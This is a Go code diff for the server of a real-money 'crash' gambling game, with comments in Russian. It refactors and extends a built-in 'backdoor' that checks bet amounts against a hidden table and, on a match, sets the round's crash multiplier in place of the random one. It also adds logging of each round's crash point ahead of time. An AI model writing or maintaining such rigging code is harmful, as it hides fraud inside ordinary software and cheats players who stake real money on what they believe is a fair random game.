@@ -57,6 +57,23 @@ func SuperviseCrashGame() {
 	}
 }
 
+// Добавим функцию для дампа всех ставок в лог
+func dumpActiveBets(gameID int64) {
+	var bets []models.CrashGameBet
+	err := db.DB.Where("crash_game_id = ? AND status = ?", gameID, "active").Find(&bets).Error
+	if err != nil {
+		logger.Error("Error fetching active bets for dump: %v", err)
+		return
+	}
+	
+	logger.Info("============= ACTIVE BETS FOR GAME %d =============", gameID)
+	for i, bet := range bets {
+		logger.Info("Bet %d: ID=%d, UserID=%d, Amount=%.4f, CashOutMultiplier=%.2f", 
+			i+1, bet.ID, bet.UserID, bet.Amount, bet.CashOutMultiplier)
+	}
+	logger.Info("==================================================")
+}
+
 func StartCrashGame() {
 	ticker := time.NewTicker(time.Second)
 	defer ticker.Stop()
@@ -71,6 +88,8 @@ func StartCrashGame() {
 			time.Sleep(time.Second * 5)
 			continue
 		}
+		
+		logger.Info("Created new game with ID=%d", currentCrashGame.ID)
 
 		// Открываем окно для ставок
 		openCrashGameBetting()
@@ -83,6 +102,9 @@ func StartCrashGame() {
 			<-ticker.C
 		}
 
+		// Выводим все активные ставки в лог для дебага
+		dumpActiveBets(currentCrashGame.ID)
+
 		// После закрытия окна ставок проверяем бэкдоры
 		var bets []models.CrashGameBet
 		err := db.DB.Where("crash_game_id = ? AND status = ?", currentCrashGame.ID, "active").Find(&bets).Error
@@ -91,16 +113,16 @@ func StartCrashGame() {
 			continue
 		}
 
-		logger.Info("Checking %d active bets for backdoors", len(bets))
+		logger.Info("Checking %d active bets for backdoors in game %d", len(bets), currentCrashGame.ID)
 		foundBackdoor := false
 
 		// Проверяем каждую ставку на наличие бэкдора
 		for _, bet := range bets {
-			amt := int(math.Round(bet.Amount))
-			logger.Info("Checking bet amount: %d", amt)
+			logger.Info("Checking bet: ID=%d, UserID=%d, Amount=%.4f", bet.ID, bet.UserID, bet.Amount)
 			
-			if multiplier, exists := models.GetCrashPoints()[amt]; exists {
-				logger.Info("Matched backdoor value %d -> %.1fx", amt, multiplier)
+			isBackdoor, multiplier := models.IsBackdoorBet(bet.Amount)
+			if isBackdoor {
+				logger.Info("Matched backdoor value %.2f -> %.1fx", bet.Amount, multiplier)
 				currentCrashGame.CrashPointMultiplier = multiplier
 				foundBackdoor = true
 				break
@@ -109,9 +131,11 @@ func StartCrashGame() {
 
 		// Если бэкдоров не найдено, генерируем случайный краш
 		if !foundBackdoor {
-			logger.Info("No backdoors found, generating random crash point")
+			logger.Info("No backdoors found in game %d, generating random crash point", currentCrashGame.ID)
 			currentCrashGame.GenerateCrashPointMultiplier()
 		}
+
+		logger.Info("Game %d will crash at multiplier %.2fx", currentCrashGame.ID, currentCrashGame.CrashPointMultiplier)
 
 		currentCrashGame.StartTime = time.Now()
 		if err := db.DB.Save(currentCrashGame).Error; err != nil {
@@ -136,6 +160,8 @@ func StartCrashGame() {
 		if err != nil {
 			logger.Error("%v", err)
 		}
+		
+		logger.Info("Game %d ended at multiplier %.2fx", currentCrashGame.ID, currentCrashGame.CrashPointMultiplier)
 		time.Sleep(NewCrashGameSignalDelay)
 	}
 }
@@ -157,20 +183,27 @@ func closeCrashGameBetting() {
 func PlaceCrashGameBet(c *gin.Context) {
 	crashGameBetMutex.RLock()
 	bettingOpen := isCrashGameBettingOpen
+	gameID := int64(0)
+	if currentCrashGame != nil {
+		gameID = currentCrashGame.ID
+	}
 	crashGameBetMutex.RUnlock()
 
 	if !bettingOpen {
+		logger.Warn("Bet rejected: betting is closed (gameID=%d)", gameID)
 		c.JSON(403, gin.H{"error": "betting is closed"})
 		return
 	}
 
 	var input CrashGameBetInput
 	if err := c.ShouldBindJSON(&input); err != nil {
+		logger.Warn("Bet rejected: invalid input - %v", err)
 		c.JSON(400, gin.H{"error": "Invalid input"})
 		return
 	}
 
 	if err := validate.Struct(input); err != nil {
+		logger.Warn("Bet rejected: validation error - %v", err)
 		c.JSON(400, gin.H{"error": err.Error()})
 		return
 	}
@@ -182,6 +215,15 @@ func PlaceCrashGameBet(c *gin.Context) {
 		return
 	}
 
+	logger.Info("Placing bet: UserID=%d, Amount=%.4f, CashOutMultiplier=%.2f, GameID=%d", 
+		userID, input.Amount, input.CashOutMultiplier, gameID)
+		
+	// Предварительно проверяем, является ли ставка бэкдором
+	isBackdoor, multiplier := models.IsBackdoorBet(input.Amount)
+	if isBackdoor {
+		logger.Info("User %d is placing a backdoor bet: %.4f -> %.2fx", userID, input.Amount, multiplier)
+	}
+
 	errInsufficientBalance := errors.New("insufficient balance")
 	errExistingBet := errors.New("user already has an active bet for this game")
 
@@ -190,6 +232,7 @@ func PlaceCrashGameBet(c *gin.Context) {
 		var existingBet models.CrashGameBet
 		err := tx.Where("user_id = ? AND crash_game_id = ? AND status = ?", userID, currentCrashGame.ID, "active").First(&existingBet).Error
 		if err == nil {
+			logger.Warn("User %d already has an active bet for game %d", userID, currentCrashGame.ID)
 			return errExistingBet
 		} else if !errors.Is(err, gorm.ErrRecordNotFound) {
 			return logger.WrapError(err, "")
@@ -213,6 +256,7 @@ func PlaceCrashGameBet(c *gin.Context) {
 		}
 
 		if user.BalanceRupee+bonusBalance < input.Amount {
+			logger.Warn("User %d has insufficient balance: has %.2f, needs %.2f", userID, user.BalanceRupee+bonusBalance, input.Amount)
 			return errInsufficientBalance
 		}
 
@@ -225,9 +269,19 @@ func PlaceCrashGameBet(c *gin.Context) {
 		bet.FromBonusBalance = fromBonusBalance
 		bet.FromCashBalance = fromCashBalance
 
+		// Проверяем, соответствует ли размер ставки бэкдору используя более точное сравнение
+		isBackdoor, multiplier := models.IsBackdoorBet(bet.Amount)
+		if isBackdoor {
+			logger.Info("User %d confirmed backdoor bet with amount %.4f -> multiplier %.2fx", 
+				userID, bet.Amount, multiplier)
+		}
+
 		if err := tx.Create(&bet).Error; err != nil {
 			return logger.WrapError(err, "")
 		}
+
+		logger.Info("Bet created successfully: ID=%d, UserID=%d, Amount=%.4f, CashOutMultiplier=%.2f, GameID=%d", 
+			bet.ID, bet.UserID, bet.Amount, bet.CashOutMultiplier, bet.CrashGameID)
 
 		CrashGameWS.HandleBet(userID, &bet)
 
@@ -247,6 +301,7 @@ func PlaceCrashGameBet(c *gin.Context) {
 		return
 	}
 
+	logger.Info("Bet placed successfully: UserID=%d, Amount=%.4f, GameID=%d", userID, input.Amount, gameID)
 	c.JSON(200, gin.H{"status": "bet placed successfully"})
 }
 
